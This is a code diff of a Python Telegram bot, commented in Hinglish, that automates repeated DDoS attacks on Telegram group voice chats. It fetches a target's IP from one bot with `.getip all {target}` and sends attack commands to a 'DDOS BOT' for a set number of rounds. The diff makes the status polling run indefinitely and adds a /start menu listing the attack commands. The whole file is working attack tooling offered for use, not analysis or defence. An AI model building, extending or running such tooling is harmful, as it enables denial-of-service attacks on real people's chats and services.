@@ -76,28 +76,109 @@ async def ip_bot_listener(event):
 @tele.on(events.NewMessage(from_users=BOT_B))
 async def bot_b_listener(event):
     """
-    DDOS BOT ke /status replies se status set karo.
-    Attack progress / cooldown spam ko ignore nahi karte,
-    sirf pattern se detect karte hain.
+    DDOS BOT ke messages se global status set karo.
     """
     global bot_b_status
     text = event.text or ""
     low = text.lower()
     print("DDOS BOT MSG:", repr(text))
 
-    # READY status (tumhare /status screenshot jaisa)
     if "✅ **ʀᴇᴀᴅʏ**" in text or "no attack running" in low:
         bot_b_status = "READY"
-
-    # COOLDOWN status
     elif "⏳ **ᴄᴏᴏʟᴅᴏᴡɴ**" in text or "cooldown" in low:
         bot_b_status = "COOLDOWN"
-
-    # RUNNING status
     elif "🔥 **ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ**" in text or "attack running" in low:
         bot_b_status = "RUNNING"
+    else:
+        pass
 
-    # baaki messages (agar format change ho jaye) ignore kar sakte ho
+
+# ==== PTB COMMANDS ====
+
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    /start -> saare commands ka menu.
+    """
+    text = (
+        "👋 IP + DDOS Control Bot ready.
+
+"
+        "Commands:
+"
+        "• /setlinkchatid <link_or_chatid>
+"
+        "   Target group VC link ya chat id set karo.
+
+"
+        "• /setcount <number>
+"
+        "   Kitni baar attack run karna hai.
+
+"
+        "• /startloop
+"
+        "   Loop start: IP BOT se IP leke DDOS BOT par attack.
+
+"
+        "• /stoploop
+"
+        "   Current loop turant stop karo.
+
+"
+        "Example:
+"
+        "/setlinkchatid -1003089005092
+"
+        "/setcount 5
+"
+        "/startloop"
+    )
+    await update.message.reply_text(text)
+
+
+async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text(
+            "Usage: /setlinkchatid <group_link_or_chatid>"
+        )
+        return
+
+    chat_targets[update.effective_chat.id] = " ".join(context.args)
+    await update.message.reply_text("✅ Link / ChatID saved")
+
+
+async def setcount(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args or not context.args[0].isdigit():
+        await update.message.reply_text(
+            "Usage: /setcount <number_of_attacks>"
+        )
+        return
+
+    n = max(1, int(context.args[0]))
+    chat_counts[update.effective_chat.id] = n
+    await update.message.reply_text(f"✅ Count set to {n}")
+
+
+async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    cid = update.effective_chat.id
+    if cid in loop_tasks:
+        await update.message.reply_text("⚠️ Loop already running")
+        return
+
+    task = asyncio.create_task(telethon_loop(cid, context))
+    loop_tasks[cid] = task
+    await update.message.reply_text("🔁 Loop started")
+
+
+async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    cid = update.effective_chat.id
+    task = loop_tasks.pop(cid, None)
+    if task:
+        task.cancel()
+        await update.message.reply_text("🛑 Loop stopped")
+    else:
+        await update.message.reply_text("No active loop running")
 
 
 # ==== CORE LOOP PER CHAT ====
@@ -105,7 +186,7 @@ async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
     """
     Har chat ke liye:
     - IP BOT se CMD lo
-    - BOT_B ka status 5s interval pe check karo (max 45s)
+    - BOT_B ka status lagatar check karo jab tak READY na ho
     - READY hote hi CMD bhejo, ~40s wait karo (attack + cooldown)
     """
     global bot_b_status
@@ -160,38 +241,26 @@ Sending `.getip all {target}` to IP BOT…''',
             parse_mode="Markdown",
         )
 
-        # -------- 2) BOT_B READY hone tak poll --------
+        # -------- 2) BOT_B READY hone tak continuous poll --------
         await context.bot.send_message(
             chat_id,
-            "🔎 Checking BOT_B `/status` (every 5s, max 45s)…"
+            "🔎 Waiting for BOT_B to be READY (continuous `/status` check)…"
         )
 
-        ready = False
-
-        for _ in range(9):           # 9 × ~5s ≈ 45s
-            # is cycle ke liye status reset
-            global bot_b_status
+        bot_b_status = "UNKNOWN"
+        while True:
             bot_b_status = "UNKNOWN"
-
             await tele.send_message(BOT_B, "/status")
-            await asyncio.sleep(2)        # /status reply ka wait
+            await asyncio.sleep(2)  # status reply aane ka time
 
             if bot_b_status == "READY":
-                ready = True
                 break
 
             await context.bot.send_message(
                 chat_id,
-                f"⏸ BOT_B status: {bot_b_status} (waiting 5s…)"
+                f"⏸ BOT_B status: {bot_b_status} (checking again in 3s…)"
             )
-            await asyncio.sleep(3)        # total ~5s per cycle
-
-        if not ready:
-            await context.bot.send_message(
-                chat_id,
-                f"⚠️ BOT_B not READY after 45s (last: {bot_b_status}), skipping this round."
-            )
-            continue
+            await asyncio.sleep(3)
 
         # -------- 3) CMD send to BOT_B --------
         await tele.send_message(BOT_B, final_cmd)
@@ -203,56 +272,10 @@ Sending `.getip all {target}` to IP BOT…''',
             parse_mode="Markdown",
         )
 
-        # 30s attack + ~10s cooldown buffer
         await asyncio.sleep(40)
 
     await context.bot.send_message(chat_id, "✅ All rounds finished.")
     loop_tasks.pop(chat_id, None)
-
-
-# ==== PTB COMMANDS ====
-async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args:
-        await update.message.reply_text(
-            "Usage: /setlinkchatid <group_link_or_chatid>"
-        )
-        return
-
-    chat_targets[update.effective_chat.id] = " ".join(context.args)
-    await update.message.reply_text("✅ Link / ChatID saved")
-
-
-async def setcount(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args or not context.args[0].isdigit():
-        await update.message.reply_text(
-            "Usage: /setcount <number_of_attacks>"
-        )
-        return
-
-    n = max(1, int(context.args[0]))
-    chat_counts[update.effective_chat.id] = n
-    await update.message.reply_text(f"✅ Count set to {n}")
-
-
-async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    cid = update.effective_chat.id
-    if cid in loop_tasks:
-        await update.message.reply_text("⚠️ Loop already running")
-        return
-
-    task = asyncio.create_task(telethon_loop(cid, context))
-    loop_tasks[cid] = task
-    await update.message.reply_text("🔁 Loop started")
-
-
-async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    cid = update.effective_chat.id
-    task = loop_tasks.pop(cid, None)
-    if task:
-        task.cancel()
-        await update.message.reply_text("🛑 Loop stopped")
-    else:
-        await update.message.reply_text("No active loop running")
 
 
 # ==== MAIN ENTRY ====
@@ -261,6 +284,7 @@ async def main():
     print("🧵 Telethon connected")
 
     app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))           # show all commands
     app.add_handler(CommandHandler("setlinkchatid", setlink))
     app.add_handler(CommandHandler("setcount", setcount))
     app.add_handler(CommandHandler("startloop", startloop))
@@ -271,7 +295,6 @@ async def main():
     await app.start()
     await app.updater.start_polling()
 
-    # Telethon ko bhi same loop pe chalaye rakho
     await tele.run_until_disconnected()
 
 
